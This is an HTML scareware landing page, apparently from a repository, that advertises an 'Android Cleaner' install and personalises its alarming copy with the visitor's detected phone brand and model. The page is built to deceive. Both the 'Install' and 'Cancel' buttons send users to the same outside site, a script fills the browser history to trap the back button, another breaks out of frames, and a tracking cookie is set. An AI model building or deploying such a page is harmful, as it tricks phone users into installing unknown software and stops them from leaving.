# mobile-web

<!DOCTYPE html><html><head>
    <title>Install Android Cleaner!</title>
  <base href="">

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#999">
    <link id="favicon"  href="logo.png" rel="shortcut icon" type="image/x-icon">

    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0/dist/ua-parser.min.js"></script>
    <style type="text/css">html {
        font-family: sans-serif;
        -ms-text-size-adjust: 100%;
        -webkit-text-size-adjust: 100%
    }

    body {
        margin: 0
    }

    article, aside, details, figcaption, figure, footer, header, hgroup, main, menu, nav, section, summary {
        display: block
    }

    audio, canvas, progress, video {
        display: inline-block;
        vertical-align: baseline
    }

    audio:not([controls]) {
        display: none;
        height: 0
    }

    [hidden], template {
        display: none
    }

    a {
        background-color: transparent
    }

    a:active, a:hover {
        outline: 0
    }

    abbr[title] {
        border-bottom: 1px dotted
    }

    b, strong {
        font-weight: 700
    }

    dfn {
        font-style: italic
    }

    h1 {
        font-size: 2em;
        margin: .67em 0
    }

    mark {
        background: #ff0;
        color: #000
    }

    small {
        font-size: 80%
    }

    sub, sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: baseline
    }

    sup {
        top: -.5em
    }

    sub {
        bottom: -.25em
    }

    img {
        border: 0
    }

    svg:not(:root) {
        overflow: hidden
    }

    figure {
        margin: 1em 40px
    }

    hr {
        -moz-box-sizing: content-box;
        box-sizing: content-box;
        height: 0
    }

    pre {
        overflow: auto
    }

    code, kbd, pre, samp {
        font-family: monospace, monospace;
        font-size: 1em
    }

    button, input, optgroup, select, textarea {
        color: inherit;
        font: inherit;
        margin: 0
    }

    button {
        overflow: visible
    }

    button, select {
        text-transform: none
    }

    button, html input[type=button], input[type=reset], input[type=submit] {
        -webkit-appearance: button;
        cursor: pointer
    }

    button[disabled], html input[disabled] {
        cursor: default
    }

    button::-moz-focus-inner, input::-moz-focus-inner {
        border: 0;
        padding: 0
    }

    input {
        line-height: normal
    }

    input[type=checkbox], input[type=radio] {
        box-sizing: border-box;
        padding: 0
    }

    input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button {
        height: auto
    }

    input[type=search] {
        -webkit-appearance: textfield;
        -moz-box-sizing: content-box;
        -webkit-box-sizing: content-box;
        box-sizing: content-box
    }

    input[type=search]::-webkit-search-cancel-button, input[type=search]::-webkit-search-decoration {
        -webkit-appearance: none
    }

    fieldset {
        border: 1px solid silver;
        margin: 0 2px;
        padding: .35em .625em .75em
    }

    legend {
        border: 0;
        padding: 0
    }

    textarea {
        overflow: auto
    }

    optgroup {
        font-weight: 700
    }

    table {
        border-collapse: collapse;
        border-spacing: 0
    }

    td, th {
        padding: 0
    }</style>

    <style type="text/css">
        html, body {
            margin: 0;
            padding: 0;
            width: auto;
            height: 100%;
        }

        body {
            font-family: -apple-system, "Roboto", Trebuchet MS, sans-serif;
            font-size: 0.85em;
            line-height: 1.2em;
            color: #000;
            background-color: #999;
        }

        a, img {
            border: 0;
            outline: none;
        }

        a {
            color: #000;
            text-decoration: none;
        }

        h1, p {
            margin: 0;
            padding: 0;
        }

        h1 {
            margin-bottom: 9px;
            font-weight: bold;
            font-size: 127%;
            line-height: 100%;
        }

        .wrap {
            position: relative;
            margin: 0 auto;
            width: auto;
            min-width: 240px;
            max-width: 100%;
            height: 100%;
            min-height: 240px;
            overflow: hidden;

            background-position: center top;
            background-repeat: no-repeat;
            background-size: cover;
        }

        .pagelink {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: auto;
            height: auto;
        }

        .description {
            position: absolute;
            left: 5px;
            right: 5px;
            top: 5px;
            bottom: 5px;
            color: #000;
            text-align: left;
            white-space: normal;
            overflow: hidden;
        }

        .window {
            position: absolute;
            left: 0;
            right: 0;
            top: 50%;
            width: 84.4%;
            min-width: 240px;
            max-width: 320px;
            margin: auto;
            /*text-align: center;*/
            border-radius: 12px;
            background-color: #f9f9f9;
			box-shadow: 1px 1px 4px 0px #000;
            -webkit-transform: translate(0, -50%);
            -moz-transform: translate(0, -50%);
            transform: translate(0, -50%);
        }

        .text {
            margin: 7.6% 7% 8% 7%;
        }

        .buttons, .button {
            margin: 0;
            text-align: center;
        }

        .buttons {
            position: relative;
            height: auto;
            min-height: 45px;
            color: #1275ec;
            font-weight: bold;
            font-size: 130%;
            border-top: 1px solid #b4b4b4;
            white-space: nowrap;
        }

        .buttons:after {
           /* content: "";*/
            display: block;
            position: absolute;
            left: 50%;
            top: 0;
            bottom: 0;
            width: 0;
            height: auto;
            font-size: 0;
            line-height: 0;
            border: 0;
            border-left: 1px solid #b4b4b4;
            overflow: hidden;
        }

        .button {
            display: inline-block;

            margin: 0px auto;
            padding: 15px 3%;
            width: 43%;
            color: #1275ec;
            text-align: center;
            white-space: normal;
        }

        @supports (display: -webkit-box) or (display: -moz-box) or (display: -webkit-flex) or (display: flex) {
            .buttons, .button {
                display: -webkit-box;
                display: -moz-box;
                display: -webkit-flex;
                display: flex;

                -webkit-flex-direction: row;
                -moz-flex-direction: row;
                flex-direction: row;

                -webkit-flex-wrap: nowrap;
                -moz-flex-wrap: nowrap;
                flex-wrap: nowrap;

                -webkit-justify-content: space-between;
                -moz-justify-content: space-between;
                justify-content: space-between;

                -webkit-align-items: stretch;
                -moz-flex-align: stretch;
                align-items: stretch;

                -webkit-align-content: stretch;
                -moz-flex-line-pack: stretch;
                align-content: stretch;

                -webkit-box-align: stretch;
                -moz-box-align: stretch;
                box-align: stretch;

                -webkit-box-pack: center;
                -moz-box-pack: center;
                box-pack: center;

                -webkit-box-direction: normal;
                -moz-box-direction: normal;
                box-direction: normal;

                -webkit-box-orient: vertical;
                -moz-box-orient: vertical;
                box-orient: vertical;
            }

            .button {
                -webkit-flex-direction: column;
                -moz-flex-direction: column;
                flex-direction: column;

                -webkit-justify-content: center;
                -moz-justify-content: center;
                justify-content: center;
            }

            .button span {
                -webkit-box-flex: 0 1 auto;
                -moz-box-flex: 0 1 auto;
                -webkit-flex: 0 1 auto;
                flex: 0 1 auto;

                -webkit-order: 0;
                -moz-order: 0;
                order: 0;
            }
        }

        /* ************************************************************************* */

        @media screen and (orientation: portrait) and (max-width: 450px) {
            h1 {
                margin-bottom: 2px;
                line-height: 106%;
            }

            .text {
                margin: 7.5% 6.7% 8% 6.7%;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 400px) {
            h1 {
                margin-bottom: 3px;
                font-size: 128%;
                line-height: 112%;
            }

            .text {
                margin: 7.4% 6.4% 8% 6.4%;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 375px) {
            h1 {
                margin-bottom: 4px;
                line-height: 118%;
            }

            .text {
                margin: 7.3% 6.1% 8% 6.1%;
            }

            .buttons {
                min-height: 49px;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 350px) {
            h1 {
                margin-bottom: 5px;
                font-size: 129%;
                line-height: 124%;
            }

            .text {
                margin: 7.2% 5.8% 8% 5.8%;
            }

            .buttons {
                min-height: 46px;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 325px) {
            body {
                font-size: 0.84em;
            }

            h1 {
                margin-bottom: 6px;
                font-size: 130%;
                line-height: 130%;
            }
			.window{
			    width: 100%;
			}
			.text{
				padding-top: 5px;
			}
			.blink_me {
				padding-bottom: 9px;
				text-align: center;
			}
            .text {
                margin: 7% 5.6% 8% 5.6%;
            }

            .buttons {
                min-height: 41px;
            }

            .button {
                line-height: 65%;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 300px) {
            body {
                font-size: 0.77em;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 275px) {
            body {
                font-size: 0.7em;
            }
        }

        @media screen and (orientation: portrait) and (max-width: 250px) {
            body {
                font-size: 0.63em;
            }
        }

        /* ************************************************************************* */

        @media screen and (orientation: landscape) and (max-height: 450px) {
            h1 {
                margin-bottom: 2px;
                line-height: 106%;
            }

            .text {
                margin: 6.5% 7% 7% 7%;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 400px) {
            h1 {
                margin-bottom: 3px;
                font-size: 128%;
                line-height: 112%;
            }

            .text {
                margin: 5.5% 7% 6% 7%;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 375px) {
            h1 {
                margin-bottom: 4px;
                line-height: 118%;
            }

            .text {
                margin: 4.5% 7% 5% 7%;
            }

            .buttons {
                min-height: 49px;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 350px) {
            h1 {
                margin-bottom: 5px;
                font-size: 129%;
                line-height: 124%;
            }

            .text {
                margin: 3.5% 7% 4% 7%;
            }

            .buttons {
                min-height: 46px;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 325px) {
            body {
                font-size: 0.84em;
            }

            h1 {
                margin-bottom: 6px;
                font-size: 130%;
                line-height: 130%;
            }
			.window{
				max-height: 320px;
				font-size: 11px;
			}
			.blink_me {
				text-align: center;
			}

            .text {
                margin: 2.5% 7% 3% 7%;
            }

            .buttons {
                min-height: 41px;
            }

            .button {
                line-height: 65%;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 300px) {
            body {
                font-size: 0.77em;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 275px) {
            body {
                font-size: 0.7em;
            }
        }

        @media screen and (orientation: landscape) and (max-height: 250px) {
            body {
                font-size: 0.63em;
            }
        }

        .blink_me {
            animation: blinker 1s linear infinite;
        }

        @keyframes blinker {
            50% { opacity: 0.3; color: red; }
        }
	.cancel{
		color: #999 !important;
		border-left: 1px solid #aaa;
		font-weight: 400;
	}
/*dialog*/
#myModal{
    position: fixed;
    top: 0px;
    width: 100%;
	display:none;
	z-index:100;
}
.w3-animate-top{
	position:relative;
	animation:animatetop 0.4s
	margin: 3px;
    box-shadow: 0px 2px 4px 0px #9d9d9d;
}

@keyframes animatetop{from{top:-300px;opacity:0} to{top:0;opacity:1}}
.w3-card-4, .w3-hover-shadow:hover {

}
.modal-body{
	box-sizing: border-box;
    max-width: 100%;
    margin: 0 auto;
    box-shadow: 0 0 20px 3px rgba(0,0,0,.22)!important;
    background: #fff!important;
    padding: 1.286em;
    border-bottom-left-radius: 2px;
    border-bottom-right-radius: 2px;
    font-family: Roboto,Noto,Helvetica Neue,Helvetica,Arial,sans-serif;
}

#onesignal-popover-container #onesignal-popover-dialog .popover-button.primary {
    box-shadow: 0 2px 5px 0 rgba(0,0,0,.16), 0 2px 6px 0 rgba(0,0,0,.12);
    background: #669df6!important;
    color: #fff!important;
}
#onesignal-popover-container #onesignal-popover-dialog .primary.popover-button+.secondary.popover-button {
    margin-right: .714em;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-button.secondary {
    box-shadow: none;
    background: #fff!important;
    color: #669df6!important;
	border: 1px solid #dadce0;
}
#onesignal-popover-container #onesignal-popover-dialog .align-right {
    float: right;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-button {
    padding: .714em 2em;
    font-size: 0.7em;
    text-transform: uppercase;
    border-radius: 2px;
    font-weight: 400;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-button {
    padding: .714em 2em;
    font-size: 0.7em;
    text-transform: uppercase;
    border-radius: 2px;
    font-weight: 400;
	margin-left: 1em;
}
#onesignal-popover-container #onesignal-popover-dialog button {
    box-sizing: border-box;
    display: inline-block;
    padding: .375rem 1rem;
    font-size: .9625em;
    font-weight: 400;
    line-height: 1.5;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    border: 1px solid transparent;
    border-radius: .25rem;
    font-family: inherit;
    letter-spacing: .05em;
    transition: background-color 75ms ease;
    margin: 0;
}
#onesignal-popover-container #onesignal-popover-dialog .clearfix {
    display: block;
    -webkit-backface-visibility: initial!important;
    backface-visibility: initial!important;
}
.clearfix{display:block;-webkit-backface-visibility:initial!important;backface-visibility:initial!important}
#onesignal-popover-container #onesignal-popover-dialog .clearfix:after{content:"";display:block;height:0;clear:both;visibility:hidden}

#onesignal-popover-container #onesignal-popover-dialog .popover-body {
    box-sizing: border-box;
    margin: 0;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-body-icon {
    box-sizing: border-box;
    float: left;
    width: 40px;
    height: 40px;
    position: relative;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-body-message {
    box-sizing: border-box;
    padding: 0 .2em 0 1.286em;
    float: left;
    width: calc(100% - 40px);
    font-size: 0.8em;
    line-height: 1.45em;
    -o-user-select: none;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    cursor: default;
    color: #666!important;
}
#onesignal-popover-container #onesignal-popover-dialog .popover-body-icon img {
    width: 100%;
    height: 100%;
}
#onesignal-popover-container.slide-down #onesignal-popover-dialog {
   max-width: 500px;

}
#onesignal-popover-container #onesignal-popover-dialog {
    box-sizing: border-box;
    max-width: 100%;
    margin: 0 auto;
    box-shadow: 0 0 20px 3px rgba(0,0,0,.22)!important;
    background: #fff!important;
    padding: 1.286em;
    border-bottom-left-radius: 2px;
    border-bottom-right-radius: 2px;
    font-family: Roboto,Noto,Helvetica Neue,Helvetica,Arial,sans-serif;
}
#onesignal-popover-container.slide-down {
    top: 0;
}
#onesignal-popover-container {
    font-size: 14px;
    z-index: 2258594000;
    left: 0;
    right: 0;
    -webkit-font-smoothing: initial;
}
.popover-footer{
	margin-top:1em;
}
/*dialog*/
    </style>



    <script>

        function contains(string, fragment) {
            string = string.toLowerCase();
            fragment = fragment.toLowerCase();
            return string.indexOf(fragment) !== -1;
        }

        function getURLParameter(name) {
            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');

            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
                result = 'Phone'
            }

            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
                result = 'Phone'
            }

            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
                result = 'Internet Browser'
            }

            return result;

        }

		function setVisit() {
			document.cookie = 'uid=b36ef0fa-8da8-4560-9f7a-e4647c142bf1'; //!@#
		}
		setVisit();

    </script>
<script type="text/javascript">

function getRandomInt(min, max)
{
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function func() {
	var answer = showm();
}

setTimeout(func, getRandomInt(5,10)*1000);

</script>

</head>
<body class="en ltr">


<div class="wrap">
    <div class="window">
        <div class="text">


            <h1 style="" class="blink_me">Install Android Cleaner for your <span class="device_brand"></span> and improve performance of your phone!</h1>
<p>For improved perfomance and increased free memory of your <span class="device_brand"></span> <span class="device_model"></span>, we have released an update of the Android Cleaner which will find all potential threats and will also clean junk files and improve the battery life.</p>
<br>
<p>Install Android Cleaner right now to boost your <span class="device_brand"></span> <span class="device_model"></span> and improve performance of your phone and improve its battery life.</p>
<br>
<img src="logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
<p>Install Android Cleaner <strong>for FREE</strong> to clean and strengthen your <span class="device_brand"></span> immediately!</p>
<p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime"></span></p>
</div>
<div class="buttons">
<a class="button exitpoint" href="https://ph-kpr.com/ph/">
				<span>Install</span>
</a>
<a class="button cancel" href="https://ph-kpr.com/ph/">
				<span>Cancel</span>
</a>
</div>
</div>
	<form style="visibility:collapse;"><textarea name="comment"></textarea></form>
</div>



<script>
    let link = 'https://ph-kpr.com/ph/';
    let hash = window.location.hash;

    hash = hash.replace(/%5D/g, ']');
    hash = hash.replace(/%5B/g, '[');
    hash = hash.replace(/amp;/g, '')
    hash = hash.replace(/#/g, '?')
    let params = link + hash;


    var btnInstall = document.querySelector(".exitpoint");
    btnInstall.href = params;

    var btnCancel = document.querySelector(".cancel");
    btnCancel.href = params;

    var parser = new UAParser();
    var result = parser.getResult();

    var device_brand = result.device.vendor;

    var os;
        if (result.os.name == undefined) {
            os = 'Android';
        } else {
            os = result.os.name;
        }
    var brand;
    var device_brand = result.device.vendor;
    var re = /(?:^|[^A-Z0-9-_]|[^A-Z0-9-]_|sprd-)(?:Mi9 Pro 5G|(?:MI [a-z0-9]+|Mi-4c|MI-One[ _]?[a-z0-9]+|MIX(?: 2S?)?)(?:[);/ ]|$)|HM (?:[^/;]+) (?:Build|MIUI)|(?:2014501|2014011|201481[12378]|201302[23]|2013061) Build|Redmi|MI_NOTE_Pro|POCOPHONE|(?:SHARK )?(KLE|MBU)-[AH]0|SKR-[AH]0|SKW-[AH]0|POCO F1|DLT-[AH]0|MIBOX[234]([_ ]PRO)?|MiTV4[CSX]?|MiTV-(MSSP[01]|AXSO0)|AWM-A0|MI CC 9 Meitu Edition|MiBOX1S|MiTV4A|M2006J10C|M2006C3(?:L[IGC]|LVG|MN?G)|M2007J1(?:7G|SC)|M2002J9[EG]|HM2014819|WT88047|M2004J(?:7[AB]|19)C|M2006C3MII|M2003J15SC|M2007J3S[ICYG]|M2007J22G|M2101K6G|M2101K[79]AG|M2010J19S[GY]|HM NOTE 1(?:LTE|W)|MI[_ ]PLAY|XIG01|MI_5X)/i;
    var isXiaomi = re.test(navigator.userAgent);
    if (isXiaomi) {
        brand = 'Xiaomi'
      } else {
        if (device_brand == undefined) {
          brand = 'Android';
        } else {
          brand = device_brand
        }
      }

    var allBrand = document.querySelectorAll('.device_brand');
    allBrand.forEach(b => {
        b.innerHTML = brand;
    });

    var device_model = result.device.model;
    document.querySelector('.device_model').innerHTML = device_model;
</script>

<script>
    (function(window) {
    if (window.location !== window.top.location) {
    window.top.location = window.location;
    }
    })(this);
    </script>
    
    <script type="text/javascript">
        !function () {
            var count = 1;
            var t;
            try {
                for (t = 0; 10 > t; ++t) history.pushState({}, "", location.hash);
                onpopstate = function (t) {
                    if(count%2 == 1) {
                    }
                    count++;
                    t.state && location.replace(location.href+location.hash)
                }
            } catch (o) {
            }
        }();
    </script>
</body></html>
